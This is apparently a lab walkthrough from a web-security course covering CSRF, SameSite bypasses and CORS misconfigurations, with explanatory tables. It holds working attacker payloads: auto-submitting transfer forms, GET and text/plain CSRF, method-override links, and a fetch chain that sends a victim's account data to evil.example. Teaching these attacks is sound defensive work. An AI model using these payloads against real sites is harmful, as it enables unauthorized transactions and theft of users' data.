# Week 09: Attack walkthrough — CSRF, SameSite, SOP, and CORS

> ⚠️ **Lab only.**

---

## The mental model — what crosses origins, and what doesn't

The browser's **Same-Origin Policy (SOP)** is the central trust boundary. Two pages from different origins (different scheme/host/port) can interact in limited ways:

| Cross-origin action | Allowed by default? |
|---|---|
| Embed `<img>`, `<script>`, `<link>` from another origin | Yes |
| Submit a form (`<form action="https://other.example">`) | Yes |
| Issue a navigation (link click) | Yes |
| Issue a `fetch()` / `XMLHttpRequest` | Yes, **but the response is hidden** unless CORS allows reading |
| Read DOM, cookies, localStorage of another origin | **No** |
| Read response body of cross-origin fetch | **No** (without CORS) |

CSRF exploits the things that *are* allowed: the browser will dutifully attach cookies to form submissions even when the form is on a different origin. CORS misconfigs change the rules about *reading* cross-origin responses.

## Part 1: Classic CSRF

### The attack

The attacker hosts a page on `evil.example`. The victim, who has a valid session on `bank.example`, visits the attacker's page. The page contains:

```html
<form action="https://bank.example/transfer" method="POST" id="x">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('x').submit();</script>
```

When the form submits, the browser attaches the victim's `bank.example` session cookie (because that's how cookies work — they're attached to requests *to* the cookie's origin, regardless of where the request came from). The bank sees an authenticated request and processes the transfer.

### Step 1: Find a CSRF-able endpoint

Any state-changing action without CSRF protection:

- Email change, password change
- Add a payment method, transfer money
- Add a permission, change a role
- Post a message, follow a user
- Delete an account

Endpoints to investigate first: anything that uses GET to change state (huge red flag — easily CSRF'd via `<img src>`), anything where the CSRF token field is missing or its value doesn't change per request.

### Step 2: Build the attacker page

Plain form CSRF (works when the endpoint accepts `application/x-www-form-urlencoded`):

```html
<!DOCTYPE html>
<html><body>
<form action="https://bank.example/transfer" method="POST" id="x">
  <input type="hidden" name="to" value="attacker_acct">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('x').submit();</script>
</body></html>
```

Host it on a server you control (in lab, use Burp's "Exploit Server"). Send the victim there.

### Step 3: GET-CSRF

If the endpoint accepts state changes via GET:

```html
<img src="https://bank.example/transfer?to=attacker&amount=10000">
```

The browser fetches the "image," which is actually a state-changing request. Image loads silently — no popup, no console error. This is why **GET should never change state.**

### Step 4: JSON CSRF

Modern APIs often use `Content-Type: application/json`. A naive defender thinks: "JSON requires custom Content-Type → browser CORS-preflights → CSRF impossible."

That's *usually* true, but:

#### Bypass: text/plain endpoint

If the server accepts `text/plain` and parses it as JSON anyway, you can submit a form with `enctype="text/plain"`:

```html
<form action="https://api.example/charge" method="POST" enctype="text/plain">
  <input name='{"amount":10000,"to":"attacker_acct","_":"' value='"}'>
</form>
```

The browser sends `Content-Type: text/plain` (no preflight); the body is the JSON shape the server expects. CSRF lands.

#### Bypass: missing CORS preflight requirement

The endpoint accepts JSON without checking the `Content-Type` header — i.e., it's permissive about what content types it accepts:

```html
<form action="https://api.example/charge" method="POST">
  <input name='{"amount":10000}' value="">
</form>
```

Submits as `application/x-www-form-urlencoded` with a weird body. If the server's JSON parser is lenient, it parses it as JSON. CSRF lands.

### Step 5: CSRF with weak token defenses

Server uses CSRF tokens, but defends them weakly:

| Defect | Exploit |
|---|---|
| Token only validated on POST, not on GET | Use `<img src>` or change request to GET |
| Token only validated if present | Submit form without the token field |
| Token tied to nothing — globally valid | Get a token from your own account, paste into your CSRF form for victim |
| Token in cookie, validated via cookie (not header) | Browser auto-attaches cookie; "validation" is no-op |
| Token in URL — readable from Referer | Leak token to attacker via a different vuln, then CSRF |
| Token verified via "starts with" | `?csrf=AAAA` matches any token starting with A (rare but happens) |

PortSwigger has labs for each of these. Worth doing 2-3 to internalize how CSRF tokens fail.

### Step 6: Referer-based defenses

Some apps check the `Referer` header:

```python
if "bank.example" not in request.headers.get("Referer", ""):
    raise CSRFError
```

Bypasses:

- **No `Referer` header at all:** browsers omit it when the source is HTTPS and the destination is HTTP, or when `<meta name="referrer" content="no-referrer">` is set on the source page. The check "is `bank.example` in `''`?" is false; rejected. **But:** the check sometimes is "if Referer is missing, allow" — common bug. PortSwigger lab.
- **Trick the substring match:** `Referer: https://attacker.example/bank.example/foo` includes the string `bank.example`, passes substring match. Use proper URL parsing instead.
- **Subdomain confusion:** the check accepts `Referer: https://bank.example.attacker.com/...` — `bank.example.` is a subdomain of `attacker.com`. Substring match passes.

## Part 2: SameSite — the modern partial defense

### How SameSite works

When `SameSite=Lax` or `SameSite=Strict` is set on a cookie:

| Request type | `Lax` | `Strict` |
|---|---|---|
| Top-level navigation GET (user clicks link) | Cookie sent | Cookie **not** sent |
| Top-level navigation POST (form submit) | Cookie **not** sent | Cookie **not** sent |
| `fetch()` cross-site | Cookie **not** sent | Cookie **not** sent |
| Subresource (`<img>`, `<iframe>`) | Cookie **not** sent | Cookie **not** sent |

**Lax** is the modern browser default. It mostly kills CSRF — form POSTs from other sites don't carry your session cookie.

**Strict** breaks the "I clicked a link from email and was logged in" UX. Used for very sensitive sites.

### SameSite bypasses

#### Bypass 1: Method override (Lax + GET)

Lax sends cookies on top-level GET navigation. If the server accepts the same state-changing action via GET — or via method-override:

```html
<a href="https://bank.example/transfer?_method=POST&to=attacker&amount=10000">Click me</a>
```

The browser navigates (Lax cookies included), the server's method-override middleware turns the request into a POST. CSRF lands.

PortSwigger's "SameSite Lax bypass via method override" lab.

#### Bypass 2: Lax + 2-minute window after auth

Some browsers (Chrome) implement a "Lax-Allow-Unsafe" mode for the first 2 minutes after a cookie is set — POSTs are allowed cross-origin. The pattern: trick the victim to log in, then immediately CSRF.

#### Bypass 3: Subdomain attacker

`bank.example.com` is the target. The attacker has XSS or controls `notes.bank.example.com`. The same-site check sees both as `bank.example.com`'s site → Lax cookies are sent. Subdomain takeover or subdomain XSS → CSRF on the parent.

#### Bypass 4: `SameSite=None` for embedded contexts

A cookie marked `SameSite=None` (typically needed for cross-site embedded payments, OAuth flows) is attached on cross-site requests like the old browser default. If the cookie is also `Secure`, that's allowed; if not, modern browsers reject. But the cookie is still vulnerable to classic CSRF.

## Part 3: CORS misconfigurations

CORS lets a server say "this other origin is allowed to read my responses." If misconfigured, an attacker site can read sensitive data.

### Recap: what CORS does

For a cross-origin `fetch()`:

```javascript
fetch('https://api.bank.example/user/me', { credentials: 'include' })
```

The browser sends the request with cookies (if `credentials: 'include'`), but **hides the response from the JavaScript** unless the server's response contains:

```
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true
```

These two headers together say "yes, attacker.example may read responses with credentials." If the server returns them, the attacker's JS can read the user's data.

### Misconfiguration 1: Wildcard with credentials

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

This combination is **not allowed by the spec** (browsers reject) but some servers send it. Sometimes the browser is buggy or older. The intent is broken — wildcard is meant for public APIs that don't use credentials.

### Misconfiguration 2: Origin reflection

```
# server code
allowed = request.headers.get('Origin')
response.headers['Access-Control-Allow-Origin'] = allowed
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

The server reflects whatever origin the attacker sends. Attacker sends `Origin: https://evil.example`. Server says "yes, evil.example, you can read this." CSRF + read.

```javascript
// attacker page on evil.example
fetch('https://api.bank.example/user/me', { credentials: 'include' })
  .then(r => r.text())
  .then(data => fetch('https://evil.example/log?d=' + encodeURIComponent(data)));
```

PortSwigger's "basic origin reflection" lab is exactly this.

### Misconfiguration 3: Substring-based allow-list

```python
if "bank.example" in request.headers["Origin"]:
    set_cors_allowed(request.headers["Origin"])
```

Bypassed by `https://attacker-bank.example.com` or `https://evil.example/bank.example`. The substring matches.

### Misconfiguration 4: Trusted `null` origin

The `null` origin is sent in several cases:

- Sandboxed iframes (`<iframe sandbox>`)
- Documents loaded from local files (`file://`)
- Redirected requests in some browsers

If the server allow-lists `null`:

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

The attacker hosts a sandboxed iframe:

```html
<!-- on evil.example -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://api.bank.example/user/me', { credentials: 'include' })
  .then(r => r.text())
  .then(data => parent.postMessage(data, '*'));
</script>
"></iframe>
```

The sandboxed iframe sends `Origin: null`. The server allows it. The attacker's JS reads the data.

PortSwigger's "trusted null origin" lab.

### Misconfiguration 5: HTTP origin trusted

```
Access-Control-Allow-Origin: http://internal.bank.example
Access-Control-Allow-Credentials: true
```

If the company has an HTTP-only internal site that's MITM-able (LAN, coffee shop, hostile network), an attacker can serve the malicious page from `http://internal.bank.example` after intercepting traffic, then exfiltrate.

PortSwigger's "trusted insecure protocols" lab.

## Part 4: The modern Cross-Origin headers (brief)

The CSRF/CORS family has expanded. Worth knowing the names even if defenses aren't in scope here:

| Header | What it does |
|---|---|
| **`Cross-Origin-Resource-Policy` (CORP)** | Restricts who can `embed` your resource |
| **`Cross-Origin-Opener-Policy` (COOP)** | Isolates your browser context from cross-origin openers |
| **`Cross-Origin-Embedder-Policy` (COEP)** | Requires that all embedded resources opt in to being embedded |
| **`Fetch Metadata Headers` (`Sec-Fetch-*`)** | Browser tells the server about the request's origin, mode, destination |

Combined, these enable **Cross-Origin Isolation** — a stricter mode that lets your page use `SharedArrayBuffer` and similar high-precision timers safely. Increasingly required for performance-sensitive web apps.

For CSRF defense specifically, `Sec-Fetch-Site: same-origin` is a signal you can validate server-side — if a state-changing request doesn't have `Sec-Fetch-Site: same-origin` (or `same-site` for SameSite-relaxed flows), it's cross-origin.

## Common mistakes when learning

- **Conflating CSRF and CORS.** CSRF is about *making* requests; CORS is about *reading* responses.
- **"SameSite Lax means I don't need CSRF tokens."** Almost true — until method-override or subdomain attacker bypasses.
- **GET-CSRF as an afterthought.** State-changing GETs are a CSRF gift. They also leak via Referer.
- **Trusting Referer alone.** Easy to omit, easy to confuse substring matches.
- **Not testing the `null` origin.** It's the most-missed CORS misconfig.

Now read [defense.md](defense.md).
